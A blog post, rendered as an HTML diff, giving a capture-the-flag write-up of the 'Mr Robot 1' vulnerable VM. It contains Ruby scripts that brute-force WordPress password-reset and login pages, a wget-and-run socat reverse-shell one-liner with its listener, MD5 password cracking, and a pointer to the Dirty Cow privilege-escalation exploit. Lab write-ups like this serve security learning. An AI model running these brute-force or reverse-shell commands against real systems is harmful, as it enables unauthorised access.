@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+		
+		
+		
+		<meta property="og:url" content="https://lexiz.xyz/posts/2023-05-22-CTF-Mr-Robot-1/">
+  <meta property="og:site_name" content="4zv4l@home">
+  <meta property="og:title" content="CTF Mr Robot 1">
+  <meta property="og:description" content="Simple writeup about the CTF Mr Robot 1. (Root-Me version)
+Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.
+First flag Go to url/robots.txt fsocity.dic (wordlist for later) key-1-of-3.txt (first flag) Go to url/key-1-of-3.txt Yeah! You got the first one. You’re on the right way! Go on!">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-05-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-05-22T00:00:00+00:00">
+    <meta property="article:tag" content="Programming">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Cli">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Ruby">
+
+	
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<title>CTF Mr Robot 1 &middot; 4zv4l@home</title>
+
+		
+		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/fonts.css">
+		
+		<link rel="icon" href="/favicon.ico"/>
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="4zv4l@home" />
+
+		<script src="/js/darkmode.js"></script>
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					
+						<h2 class="nav-title">4zv4l@home</h2>
+					
+				</a>
+				<ul>
+    
+    
+        <li>
+            <a href="/posts/">
+                
+                <span>Posts</span>
+                
+            </a>
+        </li>
+    
+        <li>
+            <a href="/about/">
+                
+                <span>About</span>
+                
+            </a>
+        </li>
+    
+</ul>
+			</div>
+		</nav>
+<div id="darkModeToggle" onclick="toggleDarkMode()">
+  &#9680; 
+</div>
+
+        
+
+<main>
+	
+
+
+        <div class="post">
+		<div class="post-info">
+    <span>Written by</span>
+        4zv4l
+        <br>
+        <span>on&nbsp;</span><time datetime="2023-05-22 00:00:00 &#43;0000 UTC">May 22, 2023</time>
+</div>
+
+		<h1 class="post-title">CTF Mr Robot 1</h1>
+<div class="post-line"></div>
+
+		
+
+		<p>Simple writeup about the CTF <code>Mr Robot 1</code>. (Root-Me version)</p>
+<blockquote>
+<p>Based on the show, Mr. Robot.
+This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
+The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.</p>
+</blockquote>
+<h2 id="first-flag">First flag</h2>
+<ul>
+<li>Go to <code>url</code>/robots.txt
+<ul>
+<li>fsocity.dic (wordlist for later)</li>
+<li>key-1-of-3.txt (first flag)</li>
+</ul>
+</li>
+<li>Go to <code>url</code>/key-1-of-3.txt</li>
+</ul>
+<blockquote>
+<p>Yeah! You got the first one. You&rsquo;re on the right way! Go on!</p>
+</blockquote>
+<h2 id="second-flag">Second flag</h2>
+<ul>
+<li>Go to <code>url</code>/O to find the <code>wordpress</code> page</li>
+<li>Brute force the <code>lost your password</code> page using <code>fsocity.dic</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;net/http&#39;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;uri&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ctf-root-me.org/wp-login.php?action=lostpassword&#39;</span>
+</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Invalid username or e-mail&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (line <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>chomp)
+</span></span><span style="display:flex;"><span>  puts <span style="color:#e6db74">&#34;trying: </span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  args <span style="color:#f92672">=</span> { <span style="color:#e6db74">user_login</span>: line }
+</span></span><span style="display:flex;"><span>  doc <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>post(<span style="color:#66d9ef">URI</span><span style="color:#f92672">.</span>parse(url), <span style="color:#66d9ef">URI</span><span style="color:#f92672">.</span>encode_www_form(args))<span style="color:#f92672">.</span>body
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span> <span style="color:#66d9ef">unless</span> doc <span style="color:#f92672">=~</span> <span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span>error<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;=&gt; </span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>Elliot</p>
+</blockquote>
+<ul>
+<li>Clear the wordlist</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat fsociety.dic | sort | uniq &gt; wordlist.dic
+</span></span></code></pre></div><ul>
+<li>Brute force the <code>login</code> page</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;net/http&#39;</span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;uri&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ctf-root-me.org/wp-login.php&#39;</span>
+</span></span><span style="display:flex;"><span>login <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Elliot&#39;</span>
+</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;The password you entered for the username&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (line <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>chomp)
+</span></span><span style="display:flex;"><span>  puts <span style="color:#e6db74">&#34;Trying: </span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>  args <span style="color:#f92672">=</span> { <span style="color:#e6db74">log</span>: login, <span style="color:#e6db74">pwd</span>: line, <span style="color:#e6db74">&#39;wp-submit&#39;</span>: <span style="color:#e6db74">&#34;Log+In&#34;</span>, <span style="color:#e6db74">redirect_to</span>: <span style="color:#e6db74">&#34;https://ctf-root-me.org/wp-admin/&#34;</span> }
+</span></span><span style="display:flex;"><span>  doc <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">.</span>post(<span style="color:#66d9ef">URI</span><span style="color:#f92672">.</span>parse(url), <span style="color:#66d9ef">URI</span><span style="color:#f92672">.</span>encode_www_form(args))<span style="color:#f92672">.</span>body
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span> <span style="color:#66d9ef">unless</span> doc <span style="color:#f92672">=~</span> <span style="color:#e6db74">/</span><span style="color:#e6db74">#{</span>error<span style="color:#e6db74">}</span><span style="color:#e6db74">/i</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;=&gt; </span><span style="color:#e6db74">#{</span>login<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">#{</span>line<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><blockquote>
+<p>ER28-0652</p>
+</blockquote>
+<ul>
+<li>Install a <code>shell</code> extension to run commands (<code>WPTerm</code>)</li>
+<li>Run on the target (reverse shell using <code>socat</code>, might change the <code>ip</code>/<code>port</code>)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:<span style="color:#e6db74">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:127.0.0.1:4444
+</span></span></code></pre></div><ul>
+<li>Run on your computer (might open a port here to catch the connection)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>socat file:<span style="color:#e6db74">`</span>tty<span style="color:#e6db74">`</span>,raw,echo<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> tcp-listen:4444
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span></code></pre></div><ul>
+<li>Go to <code>/home/robot</code></li>
+<li>Find the md5 of robot&rsquo;s password</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/robot/password.raw-md5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>robot:c3fcd3d76192e4007dfb496cca67e13b
+</span></span></code></pre></div><ul>
+<li>Crack it using <code>rockyou</code> wordlist (personally used <code>hashcat</code>)</li>
+</ul>
+<pre tabindex="0"><code>abcdefghijklmnopqrstuvwxyz
+</code></pre><ul>
+<li>Change to <code>robot</code> user</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su robot
+</span></span></code></pre></div><ul>
+<li>Cat the <code>second flag</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat key-2-of-3.txt 
+</span></span></code></pre></div><blockquote>
+<p>Congratz! You got the second key. Try to get the last one ;)</p>
+</blockquote>
+<h2 id="third-flag">Third flag</h2>
+<ul>
+<li>Run <code>uname -a</code></li>
+<li>Find out that the exploit <code>Dirty Cow</code> is possible</li>
+<li>Use the exploit from <code>https://www.exploit-db.com/exploits/40616</code></li>
+<li>Be <code>root</code> 🔥</li>
+<li>Cat the <code>last flag</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/passwd
+</span></span></code></pre></div><blockquote>
+<p>86de7bd0d5a7413227ac73d58f7144b4</p>
+</blockquote>
+<h2 id="useful-links">Useful links</h2>
+<ul>
+<li><a href="https://www.revshells.com/">reverse shell</a></li>
+<li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">simple shell to interactive tty</a></li>
+<li><a href="https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics">privilege escalation</a></li>
+</ul>
+
+
+		
+	</div>
+
+	<div class="pagination">
+		<a href="/posts/2023-04-27-Music-fetch-tool/" class="left arrow">&#8592;</a>
+		<a href="/posts/2023-05-25-Basic-backup-powershell/" class="right arrow">&#8594;</a>
+
+		<a href="#" class="top">Top</a>
+	</div>
+</main>
+
+
+        		<footer>
+			
+			<span>
+			&copy; <time datetime="2026-05-11 10:24:06.518606343 &#43;0800 HKT m=&#43;0.048057073">2026</time> 4zv4l. Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
